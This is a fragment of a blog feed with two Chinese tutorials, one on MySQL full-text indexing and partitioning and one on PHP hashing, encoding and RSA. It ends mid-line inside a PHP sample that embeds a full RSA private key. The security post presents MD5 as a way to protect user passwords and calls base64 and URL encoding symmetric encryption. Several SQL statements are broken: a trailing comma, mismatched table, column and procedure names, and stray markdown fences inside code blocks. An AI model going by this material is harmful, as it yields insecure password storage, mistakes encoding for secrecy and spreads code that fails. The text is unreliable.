        <content type="html"><![CDATA[<p>在数据量到达一定程度的时候，我们会发现，查询数据会变得越来越慢，这时候，我们需要对数据表进行优化，而且，提前优化设计表是大忌<br>接下来我们介绍全文索引和表的分区<br><a id="more"></a></p><h1 id="全文索引"><a href="#全文索引" class="headerlink" title="全文索引"></a>全文索引</h1><blockquote><p>全文索引（也称全文检索）是目前搜索引擎使用的一种关键技术。它能够利用【分词技术】等多种算法智能分析出文本文字中关键词的频率和重要性，然后按照一定的算法规则智能地筛选出我们想要的搜索结果。</p></blockquote><p>其实需要建立全文索引，与很多优秀的第三方可以使用，因为MySql自带的全文索引只能用于数据库引擎为MYISAM的数据表，如果是其他数据引擎，则全文索引不会生效。此外，MySql自带的全文索引只能对英文进行全文检索，目前无法对中文进行全文检索。如果需要对包含中文在内的文本数据进行全文检索，我们需要采用Sphinx（斯芬克斯）/Coreseek技术来处理中文。</p><h2 id="创建文章表"><a href="#创建文章表" class="headerlink" title="创建文章表"></a>创建文章表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `article` (</span><br><span class="line"></span><br><span class="line">  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line"></span><br><span class="line">  `title` varchar(200) DEFAULT NULL,</span><br><span class="line"></span><br><span class="line">  `content` text,</span><br><span class="line"></span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line"></span><br><span class="line">  FULLTEXT KEY `title` (`title`,`content`)</span><br><span class="line"></span><br><span class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><h2 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ALTER TABLE article ADD FULLTEXT INDEX fulltext_article(title,content);</span><br></pre></td></tr></table></figure><h2 id="使用全文索引查询"><a href="#使用全文索引查询" class="headerlink" title="使用全文索引查询"></a>使用全文索引查询</h2><p>以前，如果没有建立全文索引的时候，如果要模糊匹配含有某个关键词的文章，我们都会使用like<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">SELECT * FROM article WHERE content LIKE ‘%查询字符串%’;</span><br></pre></td></tr></table></figure></p><p>现在已经创建了全文索引，我们可以编写如下语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT * FROM article WHERE MATCH(title,content) AGAINST (‘查询字符串’);</span><br></pre></td></tr></table></figure></p><h1 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h1><h2 id="什么是分区"><a href="#什么是分区" class="headerlink" title="什么是分区"></a>什么是分区</h2><p>分区是将数据分段在多个位置存放，可以是同一个磁盘也可以在不同的机器。分区后，表面上还是一张表，但数据分散到多个位置了。应用读写的时候操作的还是大表名字，db自动去组织分区的数据。</p><p>##分区的类型</p><p>MySQL支持RANGE，LIST，HASH，KEY分区类型，其中以RANGE最为常用：</p><p>Range（范围）–这种模式允许将数据划分不同范围。例如可以将一个表通过年份划分成若干个分区。<br>Hash（哈希）–这中模式允许通过对表的一个或多个列的Hash Key进行计算，最后通过这个Hash码不同数值对应的数据区域进行分区。例如可以建立一个对表主键进行分区的表。<br>Key（键值）-上面Hash模式的一种延伸，这里的Hash Key是MySQL系统产生的。<br>List（预定义列表）–这种模式允许系统通过预定义的列表的值来对数据进行分割。<br>Composite（复合模式） –以上模式的组合使用　</p><h2 id="为什么要分区"><a href="#为什么要分区" class="headerlink" title="为什么要分区"></a>为什么要分区</h2><p>日常开发中我们经常会遇到大表的情况，所谓的大表是指存储了百万级乃至千万级条记录的表。这样的表过于庞大，导致数据库在查询和插入的时候耗时太长，性能低下，如果涉及联合查询的情况，性能会更加糟糕。分表和表分区的目的就是减少数据库的负担，提高数据库的效率，通常点来讲就是提高表的增删改查效率。</p><h3 id="分区的好处或者分区能解决什么问题"><a href="#分区的好处或者分区能解决什么问题" class="headerlink" title="分区的好处或者分区能解决什么问题"></a>分区的好处或者分区能解决什么问题</h3><ul><li>逻辑数据分割</li><li>提高单一的写和读应用速度</li><li>提高分区范围读查询的速度</li><li>分割数据能够有多个不同的物理文件路径</li><li>高效的保存历史数据</li><li>一个表上的约束检查</li><li>不同的主从服务器分区策略，例如master按Hash分区，slave按range分区</li></ul><h2 id="要分区的情况"><a href="#要分区的情况" class="headerlink" title="要分区的情况"></a>要分区的情况</h2><ul><li>海量数据表</li><li>历史表快速的查询，可以采用ARCHIVE+PARTITION的方式。</li><li>数据表索引大于服务器有效内存</li><li>对于大表，特别是索引远远大于服务器有效内存时，可以不用索引，此时分区效率会更有效。</li></ul><h2 id="分区实战"><a href="#分区实战" class="headerlink" title="分区实战"></a>分区实战</h2><p>建立两个表，一个按时间字段分区，一个不分区<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CREATE TABLE `fenbiao_one` (</span><br><span class="line">  `id` int(11) NOT NULL,</span><br><span class="line">  `name` varchar(255) NOT NULL,</span><br><span class="line">  `insert_date` datetime  NOT NULL,</span><br><span class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">ALTER TABLE fenbiao_one PARTITION by RANGE(`YEAR`(insert_date))</span><br><span class="line">(</span><br><span class="line">    PARTITION p1 VALUES LESS THAN (1996) , PARTITION p2 VALUES LESS THAN (1997) ,</span><br><span class="line"></span><br><span class="line">    PARTITION p3 VALUES LESS THAN (1998) , PARTITION p4 VALUES LESS THAN (1999) ,</span><br><span class="line"></span><br><span class="line">    PARTITION p5 VALUES LESS THAN (2000) , PARTITION p6 VALUES LESS THAN (2001) ,</span><br><span class="line"></span><br><span class="line">    PARTITION p7 VALUES LESS THAN (2002) , PARTITION p8 VALUES LESS THAN (2003) ,</span><br><span class="line"></span><br><span class="line">    PARTITION p9 VALUES LESS THAN (2004) , PARTITION p10 VALUES LESS THAN (2010),</span><br><span class="line"></span><br><span class="line">    PARTITION p11 VALUES LESS THAN MAXVALUE</span><br><span class="line">);</span><br><span class="line">CREATE TABLE `fenbiao_two` (</span><br><span class="line">   `id` int(11) NOT NULL,</span><br><span class="line">    `name` varchar(255) NOT NULL,</span><br><span class="line">    `insert_date` datetime  NOT NULL,</span><br><span class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure></p><h2 id="存储过程插入800万数据"><a href="#存储过程插入800万数据" class="headerlink" title="存储过程插入800万数据"></a>存储过程插入800万数据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CREATE PROCEDURE load_part_tab()  </span><br><span class="line">       begin  </span><br><span class="line">    <span class="built_in">declare</span> v int default 0;  </span><br><span class="line">    <span class="keyword">while</span> v &lt; 8000000  </span><br><span class="line">    <span class="keyword">do</span>  </span><br><span class="line">        insert into part_tab  </span><br><span class="line">        values (v,<span class="string">'testing partitions'</span>,adddate(<span class="string">'1995-01-01'</span>,(rand(v)*36520) mod 3652));  </span><br><span class="line">         <span class="built_in">set</span> v = v + 1;  </span><br><span class="line">    end <span class="keyword">while</span>;  </span><br><span class="line">    end</span><br></pre></td></tr></table></figure><p>插入分区的表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">call insert_data_pro()</span><br></pre></td></tr></table></figure></p><p>插入不分区的表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">insert into bufenqu_two select * from fenbiao_one</span><br></pre></td></tr></table></figure></p><h2 id="测试分表与不分区的性能"><a href="#测试分表与不分区的性能" class="headerlink" title="测试分表与不分区的性能"></a>测试分表与不分区的性能</h2><ul><li>分区的查询：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        SELECT COUNT(*) from fenbiao_one <span class="built_in">where</span> insert_date &gt; DATE(<span class="string">'1995-01-01'</span>) and insert_date &lt; DATE(<span class="string">'1995-12-31'</span>)</span><br><span class="line"> ```   </span><br><span class="line">&gt;[SQL] SELECT COUNT(*) from fenbiao_one <span class="built_in">where</span> insert_date &gt; DATE(<span class="string">'1995-01-01'</span>) and insert_date &lt; DATE(<span class="string">'1995-12-31'</span>)</span><br><span class="line">受影响的行: 0</span><br><span class="line">时间: 0.249ms</span><br><span class="line"></span><br><span class="line">- 没有分区的查询</span><br><span class="line"></span><br><span class="line">        SELECT COUNT(*) from bufenqu_two <span class="built_in">where</span> insert_time &gt; DATE(<span class="string">'1995-01-01'</span>) and insert_time &lt; DATE(<span class="string">'1995-12-31'</span>)</span><br><span class="line">&gt;[SQL] SELECT COUNT(*) from bufenqu_two <span class="built_in">where</span> insert_time &gt; DATE(<span class="string">'1995-01-01'</span>) and insert_time &lt; DATE(<span class="string">'1995-12-31'</span>)</span><br><span class="line">受影响的行: 0</span><br><span class="line">时间: 2.395ms</span><br><span class="line"></span><br><span class="line">结果显示分区表比未分区表的执行事件减少90%</span><br><span class="line"></span><br><span class="line"><span class="comment">## 其他分区的例子</span></span><br><span class="line">- List 类型</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">        CREATE TABLE category (  </span><br><span class="line">             cid INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,  </span><br><span class="line">             name VARCHAR(30) NOT NULL DEFAULT <span class="string">''</span>  </span><br><span class="line">        )  </span><br><span class="line">        PARTITION BY LIST (cid) (  </span><br><span class="line">             PARTITION p0 VALUES IN (0,4,8,12)  </span><br><span class="line">             DATA DIRECTORY = <span class="string">'/data0/data'</span>   </span><br><span class="line">             INDEX DIRECTORY = <span class="string">'/data1/idx'</span>,  </span><br><span class="line">               </span><br><span class="line">             PARTITION p1 VALUES IN (1,5,9,13)  </span><br><span class="line">             DATA DIRECTORY = <span class="string">'/data2/data'</span>  </span><br><span class="line">             INDEX DIRECTORY = <span class="string">'/data3/idx'</span>,  </span><br><span class="line">               </span><br><span class="line">             PARTITION p2 VALUES IN (2,6,10,14)  </span><br><span class="line">             DATA DIRECTORY = <span class="string">'/data4/data'</span>  </span><br><span class="line">             INDEX DIRECTORY = <span class="string">'/data5/idx'</span>,  </span><br><span class="line">               </span><br><span class="line">             PARTITION p3 VALUES IN (3,7,11,15)  </span><br><span class="line">             DATA DIRECTORY = <span class="string">'/data6/data'</span>  </span><br><span class="line">             INDEX DIRECTORY = <span class="string">'/data7/idx'</span>  </span><br><span class="line">        );</span><br></pre></td></tr></table></figure></li></ul><p>分成四个区，并且数据文件和索引文件单独存放</p><ul><li>HASH 类型     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CREATE TABLE users (  </span><br><span class="line">     uid INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,  </span><br><span class="line">     name VARCHAR(30) NOT NULL DEFAULT <span class="string">''</span>,  </span><br><span class="line">     email VARCHAR(30) NOT NULL DEFAULT <span class="string">''</span>  </span><br><span class="line">)  </span><br><span class="line">PARTITION BY HASH (uid) PARTITIONS 4 (  </span><br><span class="line">     PARTITION p0  </span><br><span class="line">     DATA DIRECTORY = <span class="string">'/data0/data'</span>  </span><br><span class="line">     INDEX DIRECTORY = <span class="string">'/data1/idx'</span>,  </span><br><span class="line">  </span><br><span class="line">     PARTITION p1  </span><br><span class="line">     DATA DIRECTORY = <span class="string">'/data2/data'</span>  </span><br><span class="line">     INDEX DIRECTORY = <span class="string">'/data3/idx'</span>,  </span><br><span class="line">  </span><br><span class="line">     PARTITION p2  </span><br><span class="line">     DATA DIRECTORY = <span class="string">'/data4/data'</span>  </span><br><span class="line">     INDEX DIRECTORY = <span class="string">'/data5/idx'</span>,  </span><br><span class="line">  </span><br><span class="line">     PARTITION p3  </span><br><span class="line">     DATA DIRECTORY = <span class="string">'/data6/data'</span>  </span><br><span class="line">     INDEX DIRECTORY = <span class="string">'/data7/idx'</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ul><p>分成四个区，并且数据文件和索引文件单独存放</p><ul><li>KEY 类型<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        CREATE TABLE users (  </span><br><span class="line">             uid INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,  </span><br><span class="line">             name VARCHAR(30) NOT NULL DEFAULT <span class="string">''</span>,  </span><br><span class="line">             email VARCHAR(30) NOT NULL DEFAULT <span class="string">''</span>  </span><br><span class="line">        )  </span><br><span class="line">        PARTITION BY KEY (uid) PARTITIONS 4 (  </span><br><span class="line">             PARTITION p0  </span><br><span class="line">             DATA DIRECTORY = <span class="string">'/data0/data'</span>  </span><br><span class="line">             INDEX DIRECTORY = <span class="string">'/data1/idx'</span>,  </span><br><span class="line">               </span><br><span class="line">             PARTITION p1  </span><br><span class="line">             DATA DIRECTORY = <span class="string">'/data2/data'</span>   </span><br><span class="line">             INDEX DIRECTORY = <span class="string">'/data3/idx'</span>,  </span><br><span class="line">               </span><br><span class="line">             PARTITION p2   </span><br><span class="line">             DATA DIRECTORY = <span class="string">'/data4/data'</span>  </span><br><span class="line">             INDEX DIRECTORY = <span class="string">'/data5/idx'</span>,  </span><br><span class="line">               </span><br><span class="line">             PARTITION p3   </span><br><span class="line">             DATA DIRECTORY = <span class="string">'/data6/data'</span>  </span><br><span class="line">             INDEX DIRECTORY = <span class="string">'/data7/idx'</span>  </span><br><span class="line">        );     </span><br><span class="line">```        </span><br><span class="line"><span class="comment">## 子分区实战</span></span><br><span class="line">模拟需求：</span><br><span class="line">我们在淘宝的时候筛选商品的时候，经常会筛选多个条件一起查询，也就是联合查询，如图所示:</span><br><span class="line">![taobao](taobao.png)，接下来，我们设置一个文章表模拟使用分区进行根据分类以及时间进行联合查询，</span><br><span class="line"></span><br><span class="line"><span class="comment">### 创建一张文章表</span></span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    CREATE TABLE `news_main` (</span><br><span class="line">      `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">      `news_title` varchar(50) DEFAULT NULL,</span><br><span class="line">      `news_content` text,</span><br><span class="line">      `news_class` tinyint(4) DEFAULT NULL,</span><br><span class="line">      `news_click` int(11) DEFAULT NULL,</span><br><span class="line">      `news_adddate` datetime DEFAULT NULL,</span><br><span class="line">      PRIMARY KEY (`id`)</span><br><span class="line">    ) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure></li></ul><h3 id="手工插入一些数据"><a href="#手工插入一些数据" class="headerlink" title="手工插入一些数据"></a>手工插入一些数据</h3><h3 id="分区-1"><a href="#分区-1" class="headerlink" title="分区"></a>分区</h3>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php的几种加密算法</title>
      <link href="/2017/09/21/php%E7%9A%84%E5%87%A0%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2017/09/21/php%E7%9A%84%E5%87%A0%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>php加密的方式主要分为单项散列加密，对称加密，非对称加密<br><a id="more"></a></p><h1 id="单项散列加密"><a href="#单项散列加密" class="headerlink" title="单项散列加密"></a>单项散列加密</h1><p>此种加密方式是不可逆的，常见的算法有MD5、hash、crypt、sha1</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>这个算法是不可逆的，通常用于加密用户的密码等信息来保证用户的信息安全。</p><blockquote><p>MD5 报文摘要算法将任意长度的信息作为输入值，并将其换算成一个 128 位长度的”指纹信息”或”报文摘要”值来代表这个输入值，并以换算后的值作为结果</p></blockquote><p>举个栗子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//这里是一个字符串</span><br><span class="line"><span class="variable">$str</span> = <span class="string">"hello world!"</span>;</span><br><span class="line"></span><br><span class="line">//通过MD5加密函数加密</span><br><span class="line"><span class="variable">$res</span> = md5(<span class="variable">$str</span>);//fc3ff98e8c6a0d3087d515c0473f8677</span><br><span class="line"></span><br><span class="line">//在PHP中，MD5()函数还有第二个参数，为bool类型，当为TRUE是返回的加密是16字符原始</span><br><span class="line">//二进制格式字符串，当为FALSE是返回32位的16进制，默认为<span class="literal">false</span>，一般都默认</span><br><span class="line"></span><br><span class="line">//返回二进制</span><br><span class="line"><span class="variable">$res</span> = md5(<span class="variable">$str</span>,<span class="literal">true</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><p>有两个参数，一个是需要加密的字符串，另外一个是盐值（或者成为干扰字符串），如果没有指定第二个参数那么将自己随机生成一个干扰字符串并且是以MD5加密的方式。另外这个函数在不同的操作系统上的表现形式也是不一样的，会自动检测<br>举个栗子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//需要加密的字符串</span><br><span class="line"><span class="variable">$str</span> = <span class="string">"hello world!"</span>;</span><br><span class="line"></span><br><span class="line">//使用crypt加密，不指定盐值</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = crypt(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">//指定盐值，但是盐值只能写两位，如果超过了则只会取前两位，在某些系统中会直接返回FALSE</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = crypt(<span class="variable">$str</span>,<span class="string">'seven'</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="sha1"><a href="#sha1" class="headerlink" title="sha1"></a>sha1</h2><p>有两个参数，一个是要加密的字符串，第二个是bool值，如果指定第二个参数为TRUE，则返回二进制格式的字符串，如果不指定则默认为FALSE，返回的是40位的16进制格式的字符串。<br>举个栗子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//需要加密的字符串</span><br><span class="line"><span class="variable">$str</span> = <span class="string">"hello world!"</span>;</span><br><span class="line">//通过sha1进行加密</span><br><span class="line"><span class="variable">$res</span> = sha1(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">//通过指定第二个参数加密</span><br><span class="line"><span class="variable">$res</span> = sha1(<span class="variable">$str</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><p>给定一个不确定的字符串返回特定长度的字符串，这个本质意义上来说实现了单项散列加密。使用方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">hash</span>(<span class="variable">$ago</span>,<span class="variable">$data</span>);//<span class="variable">$ago</span>是可以指定加密使用的哈希算法，例如：<span class="string">"md5"</span>，<span class="string">"sha256"</span>，<span class="string">"haval160,4"</span> 等。</span><br></pre></td></tr></table></figure></p><h1 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h1><p>加密是可逆的，对称的意思就是说加密解密都是用的同一秘钥<br>例如：</p><ul><li><p>url编码的函数<br>urlencode()<br>urldecode()<br>好像跟加密没什么关系，哈哈，此种编码主要解决url不支持汉字以及特殊字符的难题</p></li><li><p>base64<br>base64加密本质上说就是把数据转换为ASCLL码，比如一个图片进行base64编码就会变成一堆以Ascll码连接的字符串，这会更有利于文件的传输，当然base64的作用在与文件的传输。例如手机客户端上传文件到服务器，使用base64编码可以轻松实现文件的传输。<br>base64_encode()<br>base64_decode()</p></li></ul><h1 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h1><p>一般如果要加密，然后要解密的话，这种方式是最佳的</p><blockquote><p>非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。<br> 公开密钥与私有密钥是一对，如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；<br> 如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密。<br> 因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。</p></blockquote><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>服务端与客户端交互时候，提供开发api时，需要将对敏感的部分数据传输进行数据加密</p><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ul><li><p>生成公钥与密钥对<br>下载开源RSA密钥生成工具openssl（通常Linux系统都自带该程序），解压缩至独立的文件夹，进入其中的bin目录，执行以下命令：</p><pre><code>openssl genrsa -out rsa_private_key.pem 1024openssl pkcs8 -topk8 -inform PEM -in rsa_private_key.pem -outform PEM -nocrypt -out private_key.pemopenssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem</code></pre><p>第一条命令生成原始 RSA私钥文件 rsa_private_key.pem，第二条命令将原始 RSA私钥转换为 pkcs8格式，第三条生成RSA公钥 rsa_public_key.pem<br>从上面看出通过私钥能生成对应的公钥，因此我们将私钥private_key.pem用在服务器端，公钥发放给android跟ios等前端</p></li><li><p>代码示例（代码参考网上的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$private_key</span> = <span class="string">'-----BEGIN RSA PRIVATE KEY-----  </span></span><br><span class="line"><span class="string">MIICXQIBAAKBgQC3//sR2tXw0wrC2DySx8vNGlqt3Y7ldU9+LBLI6e1KS5lfc5jl  </span></span><br><span class="line"><span class="string">TGF7KBTSkCHBM3ouEHWqp1ZJ85iJe59aF5gIB2klBd6h4wrbbHA2XE1sq21ykja/  </span></span><br><span class="line"><span class="string">Gqx7/IRia3zQfxGv/qEkyGOx+XALVoOlZqDwh76o2n1vP1D+tD3amHsK7QIDAQAB  </span></span><br><span class="line"><span class="string">AoGBAKH14bMitESqD4PYwODWmy7rrrvyFPEnJJTECLjvKB7IkrVxVDkp1XiJnGKH  </span></span><br><span class="line"><span class="string">2h5syHQ5qslPSGYJ1M/XkDnGINwaLVHVD3BoKKgKg1bZn7ao5pXT+herqxaVwWs6  </span></span><br><span class="line"><span class="string">ga63yVSIC8jcODxiuvxJnUMQRLaqoF6aUb/2VWc2T5MDmxLhAkEA3pwGpvXgLiWL  </span></span><br><span class="line"><span class="string">3h7QLYZLrLrbFRuRN4CYl4UYaAKokkAvZly04Glle8ycgOc2DzL4eiL4l/+x/gaq  </span></span><br><span class="line"><span class="string">deJU/cHLRQJBANOZY0mEoVkwhU4bScSdnfM6usQowYBEwHYYh/OTv1a3SqcCE1f+  </span></span><br><span class="line"><span class="string">qbAclCqeNiHajCcDmgYJ53LfIgyv0wCS54kCQAXaPkaHclRkQlAdqUV5IWYyJ25f  </span></span><br><span class="line"><span class="string">oiq+Y8SgCCs73qixrU1YpJy9yKA/meG9smsl4Oh9IOIGI+zUygh9YdSmEq0CQQC2  </span></span><br><span class="line"><span class="string">4G3IP2G3lNDRdZIm5NZ7PfnmyRabxk/UgVUWdk47IwTZHFkdhxKfC8QepUhBsAHL  </span></span><br><span class="line"><span class="string">QjifGXY4eJKUBm3FpDGJAkAFwUxYssiJjvrHwnHFbg0rFkvvY63OSmnRxiL4X6EY  </span></span><br><span class="line"><span class="string">yI9lblCsyfpl25l7l5zmJrAHn45zAiOoBrWqpM5edu7c  </span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----'</span>;</span><br><span 